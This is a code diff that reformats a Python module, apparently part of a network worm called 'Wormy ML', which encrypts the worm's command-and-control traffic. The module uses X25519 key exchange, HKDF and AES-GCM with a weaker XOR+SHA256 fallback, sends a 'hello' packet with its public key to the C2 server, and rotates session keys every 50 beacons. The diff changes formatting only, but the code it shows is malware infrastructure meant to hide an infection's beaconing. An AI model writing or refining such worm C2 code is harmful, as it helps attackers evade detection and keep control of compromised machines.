@@ -3,16 +3,22 @@ Wormy ML Network Worm v3.0 - Perfect Forward Secrecy Crypto
 X25519 ECDH key exchange + AES-GCM session encryption.
 Replaces the static XOR+SHA256 scheme in resilient_c2.py.
 """
-import os, json, base64, hashlib, struct, time
-from typing import Tuple, Optional, Dict
+
+import base64
+import hashlib
+import json
+import os
+import struct
+import time
+from typing import Dict, Optional, Tuple
 
 # ── dependency check ─────────────────────────────────────────────────────────
 try:
-    from cryptography.hazmat.primitives.asymmetric.x25519 import (
-        X25519PrivateKey, X25519PublicKey)
-    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
     from cryptography.hazmat.primitives import hashes, serialization
+    from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
     from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
+
     _CRYPTO_AVAILABLE = True
 except ImportError:
     _CRYPTO_AVAILABLE = False
@@ -34,14 +40,14 @@ class PFSCrypto:
     Compromise of long-term key does NOT expose past sessions.
     """
 
-    NONCE_SIZE   = 12   # GCM standard
-    KEY_SIZE     = 32   # AES-256
-    HKDF_INFO    = b"wormy-v3-session"
-    HKDF_SALT    = b"wormy-pfs-salt-2024"
+    NONCE_SIZE = 12  # GCM standard
+    KEY_SIZE = 32  # AES-256
+    HKDF_INFO = b"wormy-v3-session"
+    HKDF_SALT = b"wormy-pfs-salt-2024"
 
     def __init__(self):
         self._private_key: Optional[object] = None
-        self._session_key: Optional[bytes]  = None
+        self._session_key: Optional[bytes] = None
         self._peer_pub_raw: Optional[bytes] = None
         self._available = _CRYPTO_AVAILABLE
         if self._available:
@@ -56,8 +62,8 @@ class PFSCrypto:
         """Generate a fresh ephemeral X25519 key pair."""
         if not self._available:
             return
-        self._private_key  = X25519PrivateKey.generate()
-        self._session_key  = None   # invalidated until handshake completes
+        self._private_key = X25519PrivateKey.generate()
+        self._session_key = None  # invalidated until handshake completes
         self._peer_pub_raw = None
 
     def get_public_key_bytes(self) -> bytes:
@@ -65,8 +71,8 @@ class PFSCrypto:
         if not self._available or not self._private_key:
             return os.urandom(32)
         return self._private_key.public_key().public_bytes(
-            serialization.Encoding.Raw,
-            serialization.PublicFormat.Raw)
+            serialization.Encoding.Raw, serialization.PublicFormat.Raw
+        )
 
     def complete_handshake(self, peer_pub_raw: bytes) -> bool:
         """
@@ -77,7 +83,7 @@ class PFSCrypto:
             return False
         try:
             peer_pub = X25519PublicKey.from_public_bytes(peer_pub_raw)
-            shared   = self._private_key.exchange(peer_pub)
+            shared = self._private_key.exchange(peer_pub)
             self._session_key = HKDF(
                 algorithm=hashes.SHA256(),
                 length=self.KEY_SIZE,
@@ -95,8 +101,7 @@ class PFSCrypto:
 
     # ─── encryption / decryption ─────────────────────────────────────────────
 
-    def encrypt(self, plaintext: bytes,
-                aad: bytes = b"wormy") -> Optional[bytes]:
+    def encrypt(self, plaintext: bytes, aad: bytes = b"wormy") -> Optional[bytes]:
         """
         Encrypt with AES-256-GCM.
         Output format: nonce(12) || ciphertext+tag
@@ -104,19 +109,18 @@ class PFSCrypto:
         """
         if self._available and self._session_key:
             nonce = os.urandom(self.NONCE_SIZE)
-            ct    = AESGCM(self._session_key).encrypt(nonce, plaintext, aad)
+            ct = AESGCM(self._session_key).encrypt(nonce, plaintext, aad)
             return nonce + ct
         # Fallback: XOR with random key + HMAC integrity
         return self._fallback_encrypt(plaintext)
 
-    def decrypt(self, ciphertext: bytes,
-                aad: bytes = b"wormy") -> Optional[bytes]:
+    def decrypt(self, ciphertext: bytes, aad: bytes = b"wormy") -> Optional[bytes]:
         """Decrypt AES-256-GCM ciphertext (nonce||ct+tag)."""
         if self._available and self._session_key:
             if len(ciphertext) < self.NONCE_SIZE + 16:
                 return None
-            nonce = ciphertext[:self.NONCE_SIZE]
-            ct    = ciphertext[self.NONCE_SIZE:]
+            nonce = ciphertext[: self.NONCE_SIZE]
+            ct = ciphertext[self.NONCE_SIZE :]
             try:
                 return AESGCM(self._session_key).decrypt(nonce, ct, aad)
             except Exception:
@@ -141,28 +145,27 @@ class PFSCrypto:
 
     def _fallback_encrypt(self, plaintext: bytes) -> bytes:
         """XOR stream cipher with random 32-byte key + SHA256 MAC."""
-        key   = self._fallback_key
+        key = self._fallback_key
         nonce = os.urandom(16)
-        ks    = hashlib.sha256(key + nonce).digest()
+        ks = hashlib.sha256(key + nonce).digest()
         # extend keystream
         while len(ks) < len(plaintext):
             ks += hashlib.sha256(ks).digest()
-        ct  = bytes(a ^ b for a, b in zip(plaintext, ks[:len(plaintext)]))
+        ct = bytes(a ^ b for a, b in zip(plaintext, ks[: len(plaintext)]))
         mac = hashlib.sha256(key + nonce + ct).digest()[:16]
         return nonce + ct + mac
 
     def _fallback_decrypt(self, data: bytes) -> Optional[bytes]:
         if len(data) < 32:
             return None
-        key, nonce, ct, mac = (self._fallback_key,
-                                data[:16], data[16:-16], data[-16:])
+        key, nonce, ct, mac = (self._fallback_key, data[:16], data[16:-16], data[-16:])
         exp_mac = hashlib.sha256(key + nonce + ct).digest()[:16]
         if exp_mac != mac:
             return None
         ks = hashlib.sha256(key + nonce).digest()
         while len(ks) < len(ct):
             ks += hashlib.sha256(ks).digest()
-        return bytes(a ^ b for a, b in zip(ct, ks[:len(ct)]))
+        return bytes(a ^ b for a, b in zip(ct, ks[: len(ct)]))
 
     # ─── status ──────────────────────────────────────────────────────────────
 
@@ -174,12 +177,10 @@ class PFSCrypto:
 
     def get_status(self) -> Dict:
         return {
-            "pfs_available":    self._available,
-            "session_active":   self.has_session(),
-            "algorithm":        "X25519+HKDF+AES-256-GCM" if self._available
-                                else "XOR+SHA256 (fallback)",
-            "peer_pub":         self._peer_pub_raw.hex()[:16] + "..."
-                                if self._peer_pub_raw else None,
+            "pfs_available": self._available,
+            "session_active": self.has_session(),
+            "algorithm": "X25519+HKDF+AES-256-GCM" if self._available else "XOR+SHA256 (fallback)",
+            "peer_pub": self._peer_pub_raw.hex()[:16] + "..." if self._peer_pub_raw else None,
         }
 
 
@@ -189,19 +190,18 @@ class PFSChannel:
     Manages handshake and automatic key rotation every N beacons.
     """
 
-    ROTATION_INTERVAL = 50   # rotate session key every 50 beacons
+    ROTATION_INTERVAL = 50  # rotate session key every 50 beacons
 
     def __init__(self):
-        self._crypto      = PFSCrypto()
+        self._crypto = PFSCrypto()
         self._beacon_count = 0
         self._handshake_done = False
 
     def build_hello_packet(self) -> Dict:
         """First packet to send to C2 — contains our ephemeral public key."""
         return {
-            "type":      "hello",
-            "pub_key":   base64.b64encode(
-                             self._crypto.get_public_key_bytes()).decode(),
+            "type": "hello",
+            "pub_key": base64.b64encode(self._crypto.get_public_key_bytes()).decode(),
             "timestamp": time.time(),
         }
 
@@ -239,6 +239,6 @@ class PFSChannel:
     def get_status(self) -> Dict:
         return {
             **self._crypto.get_status(),
-            "handshake_done":  self._handshake_done,
-            "beacons_sent":    self._beacon_count,
+            "handshake_done": self._handshake_done,
+            "beacons_sent": self._beacon_count,
         }
